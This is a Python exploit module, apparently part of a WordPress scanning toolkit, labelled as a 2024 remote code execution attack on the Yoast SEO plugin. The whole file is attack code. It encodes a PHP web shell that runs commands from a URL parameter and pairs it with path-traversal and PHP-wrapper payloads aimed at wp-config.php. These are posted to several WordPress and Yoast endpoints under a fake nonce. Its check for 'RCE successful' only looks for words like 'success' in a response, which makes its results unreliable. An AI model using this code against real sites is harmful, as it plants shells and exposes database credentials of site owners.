import requests
from core.printmodels import *
import base64

class Yoast_SEO_RCE:
    def __init__(self):
        self.name = "Yoast SEO Plugin RCE"
        self.description = "Yoast SEO Plugin Remote Code Execution (2024)"
        self.author = "DrDataYE"

    def Exploit(self, site):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/json',
                'X-WP-Nonce': 'DrDataYE'
            }

            php_payload = '<?php system($_GET["cmd"]); ?>'
            encoded_payload = base64.b64encode(php_payload.encode()).decode()

            payloads = [
                {
                    "wpseo_social": {
                        "facebook_site": f"data://text/plain;base64,{encoded_payload}",
                        "twitter_site": "../../../../wp-config.php"
                    }
                },
                {
                    "wpseo": {
                        "custom_canonical": "php://filter/convert.base64-decode/resource=../wp-config.php",
                        "metadesc": f"<pre>{encoded_payload}</pre>"
                    }
                }
            ]

            endpoints = [
                f"{site}/wp-json/yoast/v1/configuration",
                f"{site}/wp-admin/admin-ajax.php?action=wpseo_set_option",
                f"{site}/wp-json/wp/v2/posts?context=edit"
            ]

            for endpoint in endpoints:
                for payload in payloads:
                    response = requests.post(endpoint, headers=headers, json=payload, verify=False, timeout=10)
                    if response.status_code == 200 and ('success' in response.text or 'updated' in response.text):
                        return PrintSuccess(f"[Yoast-SEO-2024] Vulnerable! RCE successful at {endpoint}")

            return PrintFailed("[Yoast-SEO-2024] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[Yoast-SEO-2024] Error: {str(e)}")
